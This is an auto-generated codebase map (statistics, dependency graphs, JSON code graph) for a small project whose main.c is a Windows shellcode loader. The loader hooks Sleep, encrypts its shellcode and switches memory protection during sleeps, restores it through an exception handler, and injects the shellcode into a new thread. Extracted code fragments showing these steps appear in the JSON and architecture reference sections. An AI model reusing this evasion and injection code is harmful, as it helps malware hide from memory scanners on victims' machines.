# Polyglot Codebase Knowledge Graph

> Generated offline by **readmenator**. Supports C, C++, Python, Go, Rust, JS/TS, Java, C#, Shell, PHP, Dart, GDScript, Nim, ASM, Ruby, Swift, Kotlin, Scala, Lua, Elixir.
> No LLMs. No tokens. Pure static analysis. See more [here](https://github.com/grisuno/ReadMenator)

**Total Files Parsed:** 4 | **Total Symbols Extracted:** 15 | **Total Imports:** 7

<!-- ranking_model: v1.0 | weights: {ppr:0.45,auth:0.2,test:0.15,doc:0.1,fresh:0.1} | alpha:0.85 | commit:4c8e0d2 | date:2026-07-18 -->


## Table of Contents

1. [Statistics Dashboard](#statistics-dashboard)
2. [Architectural Layers](#architectural-layers)
3. [Ranked Context](#ranked-context)
4. [God Nodes](#god-nodes)
5. [Community Analysis](#community-analysis)
6. [Suggested Questions](#suggested-questions)
7. [Hotspot Analysis](#hotspot-analysis)
8. [Change Impact Analysis](#change-impact-analysis)
9. [Suggested Linting Rules](#suggested-linting-rules)
10. [Orphans](#orphans)
11. [Query Recipes](#query-recipes)
12. [Structural Knowledge Map](#structural-knowledge-map)
13. [UML Class Diagram](#uml-class-diagram)
14. [Code Property Graph](#code-property-graph)
15. [Architecture Reference](#architecture-reference)
    - [C (1 files)](#c-1-files)
    - [H (1 files)](#h-1-files)
    - [PY (1 files)](#py-1-files)
    - [SH (1 files)](#sh-1-files)

---

## Statistics Dashboard

| Metric | Value |
|--------|-------|
| Total Files | 4 |
| Total Symbols | 15 |
| Total Imports | 7 |
| Call Edges | 0 |
| Inheritance Edges | 0 |
| Languages | 4 |
| Avg Symbols/File | 3.8 |
| Avg Imports/File | 1.8 |

### Top Files by Import Count (Fan-Out)

| File | Imports | Symbols | Language |
|------|---------|---------|----------|
| `header.h` | 5 | 2 | h |
| `app.py` | 1 | 0 | py |
| `main.c` | 1 | 13 | c |

### Top Files by Imported-By Count (Fan-In)

| File | Imported By | Symbols | Language |
|------|-------------|---------|----------|
| `header.h` | 1 | 2 | h |

---

## Architectural Layers

Auto-detected from path patterns, naming conventions, and imported frameworks.

| Layer | Files |
|-------|-------|
| utility | 4 |

### utility

- `app.py` (py, 0 symbols)
- `header.h` (h, 2 symbols)
- `install.sh` (sh, 0 symbols)
- `main.c` (c, 13 symbols)

---

## Ranked Context

Files ranked by composite score for the current query context. The ranking combines Personalized PageRank (query relevance), global authority, test coverage, documentation coverage, and code freshness. Model: v1.0.

| Rank | File | Composite | PPR | Authority | Test | Doc |
|------|------|-----------|-----|-----------|------|-----|
| 1 | `header.h` | 0.4719 | 0.6491 | 0.6491 | 0.00 | 0.50 |
| 2 | `main.c` | 0.3204 | 0.3509 | 0.3509 | 0.00 | 0.92 |
| 3 | `app.py` | 0.1000 | 0.0000 | 0.0000 | 0.00 | 1.00 |
| 4 | `install.sh` | 0.0000 | 0.0000 | 0.0000 | 0.00 | 0.00 |

---

## God Nodes

Most architecturally central files ranked by combined import/export degree and symbol richness.

| File | Score | Connections | PageRank |
|------|-------|-------------|----------|
| `main.c` | 3.3 | | 0.3509 |
| `header.h` | 2.2 | | 0.6491 |
| `app.py` | 0.0 | | 0.0000 |
| `install.sh` | 0.0 | | 0.0000 |

---

## Community Analysis

Files grouped by import-based community detection. Cohesion measures how tightly connected each community is internally.

### root (Cohesion: 1.00)

**2 files** in this community:

- `header.h` (h, 2 symbols)
- `main.c` (c, 13 symbols)

---

## Suggested Questions

Auto-generated exploration prompts based on graph structure:

- What does main.c depend on, and what depends on it? (1 connections)
- What does header.h depend on, and what depends on it? (1 connections)
- What does app.py depend on, and what depends on it? (0 connections)
- What is the overall architecture of this codebase?

---

## Hotspot Analysis

Files ranked by combined complexity (symbol count) and centrality (connection count). High-scoring files are architecturally critical and may need refactoring attention.

| File | Complexity | Centrality | Combined | Symbols | Connections |
|------|-----------|------------|----------|---------|-------------|
| `header.h` | 0.154 | 1.000 | 0.661 | 2 | 6 |
| `main.c` | 1.000 | 0.167 | 0.500 | 13 | 1 |
| `app.py` | 0.000 | 0.167 | 0.100 | 0 | 1 |
| `install.sh` | 0.000 | 0.000 | 0.000 | 0 | 0 |

---

## Change Impact Analysis

Files sorted by how many other files would be affected if they changed. High-impact files should be changed with caution.

| File | Direct Dependents | Transitive Dependents | Total Impact |
|------|------------------|----------------------|--------------|
| `app.py` | 0 | 0 | 0 |
| `header.h` | 0 | 0 | 0 |
| `install.sh` | 0 | 0 | 0 |
| `main.c` | 0 | 0 | 0 |

---

## Suggested Linting Rules

Automatically suggested linting and security rules based on patterns detected in the codebase. These can be exported as Semgrep rules using the `--export-rules` flag.

| Rule ID | Severity | Description | Language | Matches |
|---------|----------|-------------|----------|---------|
| `RM001` | info | Large number of functions in c: 13 total | c | 13 |

---

## Orphans

Files with no documentation or low connectivity. These are candidates for documentation investment or cleanup.

- `install.sh` (0 symbols, no doc)

---

## Query Recipes

Example queries you can run against this knowledge base using the ranking engine:

```
# Find files most relevant to a concept
readmenator query "Where is the import resolver implemented?"

# Rank files by relevance to a topic
readmenator query "How does documentation generation work?"

# Explain why a file ranks highly
readmenator query "explain readmenator/_documentation.py"

# Trace dependency paths with ranked context
readmenator query "path from CLI to exporter"
```

The ranking model uses the following signals:

- **Personalized PageRank** (45% weight): query-specific relevance via seed propagation
- **Global Authority** (20% weight): structural importance via standard PageRank
- **Test Coverage** (15% weight): fraction of symbols referenced in test files
- **Doc Coverage** (10% weight): presence of docstrings and file-level docs
- **Freshness** (10% weight): recent modification activity

Results include score decomposition and justification paths for each ranked item.

---

## Structural Knowledge Map

```mermaid
graph TD
    classDef mod fill:#1e1e1e,stroke:#ff6666,stroke-width:2px,color:#fff;
    classDef cls fill:#2d2d2d,stroke:#4ec9b0,stroke-width:2px,color:#fff;
    classDef fn fill:#333,stroke:#dcdcaa,stroke-width:1px,color:#dcdcaa;
    classDef ext fill:#111,stroke:#666,stroke-dasharray:5 5,color:#aaa;
    subgraph community_0 ["root"]
    header_h["header.h (h)"]
    class header_h mod;
    header_h_HEADER_H["HEADER_H"]
    class header_h_HEADER_H fn;
    header_h --> header_h_HEADER_H
    header_h_log["log"]
    class header_h_log fn;
    header_h --> header_h_log
    main_c["main.c (c)"]
    class main_c mod;
    main_c_get_return_address["get_return_address"]
    class main_c_get_return_address fn;
    main_c --> main_c_get_return_address
    main_c_MySleep["MySleep"]
    class main_c_MySleep fn;
    main_c --> main_c_MySleep
    main_c_fastTrampoline["fastTrampoline"]
    class main_c_fastTrampoline fn;
    main_c --> main_c_fastTrampoline
    main_c_xor32["xor32"]
    class main_c_xor32 fn;
    main_c --> main_c_xor32
    main_c_collectMemPriv["collectMemPriv"]
    class main_c_collectMemPriv fn;
    main_c --> main_c_collectMemPriv
    app_py["app.py (py)"]
    class app_py mod;
    install_sh["install.sh (sh)"]
    class install_sh mod;
    end
    ext_os["os"]
    class ext_os ext;
    app_py -.->|imports| ext_os
    ext_windows_h["windows.h"]
    class ext_windows_h ext;
    header_h -.->|imports| ext_windows_h
    ext_stdio_h["stdio.h"]
    class ext_stdio_h ext;
    header_h -.->|imports| ext_stdio_h
    ext_stdlib_h["stdlib.h"]
    class ext_stdlib_h ext;
    header_h -.->|imports| ext_stdlib_h
    ext_stdint_h["stdint.h"]
    class ext_stdint_h ext;
    header_h -.->|imports| ext_stdint_h
    ext_stdbool_h["stdbool.h"]
    class ext_stdbool_h ext;
    header_h -.->|imports| ext_stdbool_h
    ext_header_h["header.h"]
    class ext_header_h ext;
    main_c -.->|imports| ext_header_h
```

---

## Code Property Graph

Machine-readable Code Property Graph (CPG) in JSON-LD format. This block allows AI agents to parse the full structural graph without additional file reads. Compatible with GraphRAG pipelines.

```json
{"@context": "https://schema.org", "analysis": {"communities": [{"cohesion": 1.0, "id": 0, "label": "root", "size": 2}], "god_nodes": [{"node_id": "main.c", "score": 3.3}, {"node_id": "header.h", "score": 2.2}, {"node_id": "app.py", "score": 0.0}, {"node_id": "install.sh", "score": 0.0}], "surprising_connections": []}, "edges": [{"confidence": "EXTRACTED", "relation": "imports", "source": "app.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "windows.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdbool.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "main.c", "target": "header.h"}], "generator": "readmenator", "metadata": {"edge_count": 7, "file_count": 4, "language_count": 4, "symbol_count": 15}, "nodes": [{"doc": "_*_ coding: utf8 _*_", "id": "app.py", "kind": "module", "label": "app.py", "language": "py", "sha256": "57b21bdb023585b8", "symbol_count": 0, "symbols": []}, {"doc": "ifndef HEADER_H define HEADER_H  include <windows.h> include <stdio.h> include <stdlib.h> include <stdint.h> include <stdbool.h>  ifdef _WIN64", "id": "header.h", "kind": "module", "label": "header.h", "language": "h", "sha256": "42458ee4f6c0b32b", "symbol_count": 2, "symbols": [{"kind": "macro", "line": 2, "name": "HEADER_H"}, {"kind": "macro", "line": 48, "name": "log"}]}, {"id": "install.sh", "kind": "module", "label": "install.sh", "language": "sh", "sha256": "c907d80fd6734993", "symbol_count": 0, "symbols": []}, {"doc": "include \"header.h\"", "id": "main.c", "kind": "module", "label": "main.c", "language": "c", "sha256": "886388d12a847b85", "symbol_count": 13, "symbols": [{"doc": "include \"header.h\"", "kind": "function", "line": 2, "name": "get_return_address", "signature": "static inline UPTR get_return_address(void)"}, {"doc": "{ #ifdef _WIN64 return (UPTR)__builtin_return_address(0); #else /* 32 bits – también funciona return (UPTR)__builtin_return_address(0); #endif } /* ------------- globales ------------- HookedSleep        g_hookedSleep; FluctuationMetadata g_fluctuationData; TypeOfFluctuation   g_fluctuate; /* ------------- hook ---------------", "kind": "function", "line": 18, "name": "MySleep", "signature": "static void WINAPI MySleep(DWORD ms)"}, {"doc": "b.originalBytesSize = sizeof(g_hookedSleep.sleepStub); /* des-hook temporal fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b); Sleep(ms); if (g_fluctuate == FluctuateToRW) shellcodeEncryptDecrypt(caller); /* re-hook fastTrampoline(true,  (BYTE*)Sleep, (LPVOID)MySleep, NULL); } /* ------------- trampolín -----------", "kind": "function", "line": 43, "name": "fastTrampoline", "signature": "bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)"}, {"doc": "memcpy(target, b->originalBytes, b->originalBytesSize); size = b->originalBytesSize; } typeNtFlushInstructionCache fn; fn = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtFlushInstructionCache\"); if (fn) fn(GetCurrentProcess(), target, size); VirtualProtect(target, size, old, &old); return true; } /* ------------- xor 32 --------------", "kind": "function", "line": 93, "name": "xor32", "signature": "void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)"}, {"kind": "function", "line": 104, "name": "collectMemPriv", "signature": "static void collectMemPriv(void)"}, {"doc": "(mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) ) { if (used == alloc) { alloc = alloc ? alloc*2 : 64; g_memMap = realloc(g_memMap, alloc * sizeof(mbi)); } ((MEMORY_BASIC_INFORMATION*)g_memMap)[used++] = mbi; } addr = (LPBYTE)addr + mbi.RegionSize; } g_memCount = used; } /* ------------- shellcode init -------", "kind": "function", "line": 131, "name": "initializeShellcodeFluctuation", "signature": "void initializeShellcodeFluctuation(LPVOID caller)"}, {"doc": "g_fluctuationData.shellcodeSize = m->RegionSize; g_fluctuationData.currentlyEncrypted = false; g_fluctuationData.encodeKey = ((uint32_t)rand()<<16) ^ (uint32_t)rand(); g_fluctuationData.protect    = PAGE_EXECUTE_READ; log(\"[+] Fluctuation ready: 0x%p  size=%zu  key=%08X\", m->BaseAddress, m->RegionSize, g_fluctuationData.encodeKey); return; } } log(\"[!] Caller not found in MEM_PRIVATE RX/RWX – aborting\"); ExitProcess(0); } /* ------------- es thread shellcode? --", "kind": "function", "line": 159, "name": "isShellcodeThread", "signature": "bool isShellcodeThread(LPVOID addr)"}, {"doc": "ExitProcess(0); } /* ------------- es thread shellcode? -- bool isShellcodeThread(LPVOID addr) { MEMORY_BASIC_INFORMATION mbi; if (!VirtualQuery(addr, &mbi, sizeof(mbi))) return false; if (mbi.Type!=MEM_PRIVATE) return false; DWORD want = (g_fluctuate==FluctuateToRW)?PAGE_READWRITE:PAGE_NOACCESS; return (mbi.Protect & (PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|want)) != 0; } /* ------------- fluctuación -----------", "kind": "function", "line": 169, "name": "shellcodeEncryptDecrypt", "signature": "void shellcodeEncryptDecrypt(LPVOID caller)"}, {"doc": "VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &old); log(\"[>] Flipped to NoAccess\"); } else if (g_fluctuationData.currentlyEncrypted){ VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &old); log(\"[<] Flipped back to RX\"); } g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted; } /* ------------- VEH ------------------", "kind": "function", "line": 207, "name": "VEHHandler", "signature": "LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)"}, {"doc": "#endif log(\"[.] AV at 0x%p\", (void*)ip); UPTR base = (UPTR)g_fluctuationData.shellcodeAddr; UPTR end  = base + g_fluctuationData.shellcodeSize; if (ip>=base && ip<end){ log(\"[+] Shellcode hit – restoring RX & decrypt\"); shellcodeEncryptDecrypt((LPVOID)ip); return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH; } /* ------------- leer archivo ---------", "kind": "function", "line": 230, "name": "readShellcode", "signature": "bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)"}, {"doc": "bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize) { HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL, OPEN_EXISTING,0,NULL); if (h==INVALID_HANDLE_VALUE) return false; DWORD sz = GetFileSize(h,NULL), rd; uint8_t *buf = malloc(sz); bool ok = ReadFile(h,buf,sz,&rd,NULL) && rd==sz; CloseHandle(h); if (ok) { *out=buf; *outSize=sz; } else free(buf); return ok; } /* ------------- inyectar -------------", "kind": "function", "line": 244, "name": "runShellcode", "signature": "static DWORD WINAPI runShellcode(LPVOID param)"}, {"kind": "function", "line": 249, "name": "injectShellcode", "signature": "bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)"}, {"doc": "bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread) { void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PAGE_READWRITE); if (!mem) return false; memcpy(mem,sc,scSize); DWORD old; if (!VirtualProtect(mem,scSize,PAGE_EXECUTE_READ,&old)){ VirtualFree(mem,0,MEM_RELEASE); return false; } outThread = CreateThread(NULL,0,runShellcode,mem,0,NULL); return *outThread != NULL; } /* ------------- main -----------------", "kind": "function", "line": 264, "name": "main", "signature": "int main(int argc, char **argv)"}]}], "type": "CodePropertyGraph", "version": "1.0"}
```

---

## Architecture Reference

### C (1 files)

#### `main.c`
**Path:** `main.c`
**File Doc:** *include "header.h"*

**Functions:**
- `get_return_address` (line 2) `static inline UPTR get_return_address(void)` - *include "header.h"*
- `MySleep` (line 18) `static void WINAPI MySleep(DWORD ms)` - *{ #ifdef _WIN64 return (UPTR)__builtin_return_address(0); #else /* 32 bits – también funciona return (UPTR)__builtin_return_address(0); #endif } /* ------------- globales ------------- HookedSleep        g_hookedSleep; FluctuationMetadata g_fluctuationData; TypeOfFluctuation   g_fluctuate; /* ------------- hook ---------------*
- `fastTrampoline` (line 43) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)` - *b.originalBytesSize = sizeof(g_hookedSleep.sleepStub); /* des-hook temporal fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b); Sleep(ms); if (g_fluctuate == FluctuateToRW) shellcodeEncryptDecrypt(caller); /* re-hook fastTrampoline(true,  (BYTE*)Sleep, (LPVOID)MySleep, NULL); } /* ------------- trampolín -----------*
- `xor32` (line 93) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)` - *memcpy(target, b->originalBytes, b->originalBytesSize); size = b->originalBytesSize; } typeNtFlushInstructionCache fn; fn = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache"); if (fn) fn(GetCurrentProcess(), target, size); VirtualProtect(target, size, old, &old); return true; } /* ------------- xor 32 --------------*
- `collectMemPriv` (line 104) `static void collectMemPriv(void)`
- `initializeShellcodeFluctuation` (line 131) `void initializeShellcodeFluctuation(LPVOID caller)` - *(mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) ) { if (used == alloc) { alloc = alloc ? alloc*2 : 64; g_memMap = realloc(g_memMap, alloc * sizeof(mbi)); } ((MEMORY_BASIC_INFORMATION*)g_memMap)[used++] = mbi; } addr = (LPBYTE)addr + mbi.RegionSize; } g_memCount = used; } /* ------------- shellcode init -------*
- `isShellcodeThread` (line 159) `bool isShellcodeThread(LPVOID addr)` - *g_fluctuationData.shellcodeSize = m->RegionSize; g_fluctuationData.currentlyEncrypted = false; g_fluctuationData.encodeKey = ((uint32_t)rand()<<16) ^ (uint32_t)rand(); g_fluctuationData.protect    = PAGE_EXECUTE_READ; log("[+] Fluctuation ready: 0x%p  size=%zu  key=%08X", m->BaseAddress, m->RegionSize, g_fluctuationData.encodeKey); return; } } log("[!] Caller not found in MEM_PRIVATE RX/RWX – aborting"); ExitProcess(0); } /* ------------- es thread shellcode? --*
- `shellcodeEncryptDecrypt` (line 169) `void shellcodeEncryptDecrypt(LPVOID caller)` - *ExitProcess(0); } /* ------------- es thread shellcode? -- bool isShellcodeThread(LPVOID addr) { MEMORY_BASIC_INFORMATION mbi; if (!VirtualQuery(addr, &mbi, sizeof(mbi))) return false; if (mbi.Type!=MEM_PRIVATE) return false; DWORD want = (g_fluctuate==FluctuateToRW)?PAGE_READWRITE:PAGE_NOACCESS; return (mbi.Protect & (PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|want)) != 0; } /* ------------- fluctuación -----------*
- `VEHHandler` (line 207) `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)` - *VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &old); log("[>] Flipped to NoAccess"); } else if (g_fluctuationData.currentlyEncrypted){ VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &old); log("[<] Flipped back to RX"); } g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted; } /* ------------- VEH ------------------*
- `readShellcode` (line 230) `bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)` - *#endif log("[.] AV at 0x%p", (void*)ip); UPTR base = (UPTR)g_fluctuationData.shellcodeAddr; UPTR end  = base + g_fluctuationData.shellcodeSize; if (ip>=base && ip<end){ log("[+] Shellcode hit – restoring RX & decrypt"); shellcodeEncryptDecrypt((LPVOID)ip); return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH; } /* ------------- leer archivo ---------*
- `runShellcode` (line 244) `static DWORD WINAPI runShellcode(LPVOID param)` - *bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize) { HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL, OPEN_EXISTING,0,NULL); if (h==INVALID_HANDLE_VALUE) return false; DWORD sz = GetFileSize(h,NULL), rd; uint8_t *buf = malloc(sz); bool ok = ReadFile(h,buf,sz,&rd,NULL) && rd==sz; CloseHandle(h); if (ok) { *out=buf; *outSize=sz; } else free(buf); return ok; } /* ------------- inyectar -------------*
- `injectShellcode` (line 249) `bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)`
- `main` (line 264) `int main(int argc, char **argv)` - *bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread) { void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PAGE_READWRITE); if (!mem) return false; memcpy(mem,sc,scSize); DWORD old; if (!VirtualProtect(mem,scSize,PAGE_EXECUTE_READ,&old)){ VirtualFree(mem,0,MEM_RELEASE); return false; } outThread = CreateThread(NULL,0,runShellcode,mem,0,NULL); return *outThread != NULL; } /* ------------- main -----------------*

### H (1 files)

#### `header.h`
**Path:** `header.h`
**File Doc:** *ifndef HEADER_H define HEADER_H  include <windows.h> include <stdio.h> include <stdlib.h> include <stdint.h> include <stdbool.h>  ifdef _WIN64*

**Imported by:** `main.c`

**Macros:**
- `HEADER_H` (line 2)
- `log` (line 48)

### PY (1 files)

#### `app.py`
**Path:** `app.py`
**File Doc:** *_*_ coding: utf8 _*_*

*No symbols extracted*

### SH (1 files)

#### `install.sh`
**Path:** `install.sh`

*No symbols extracted*
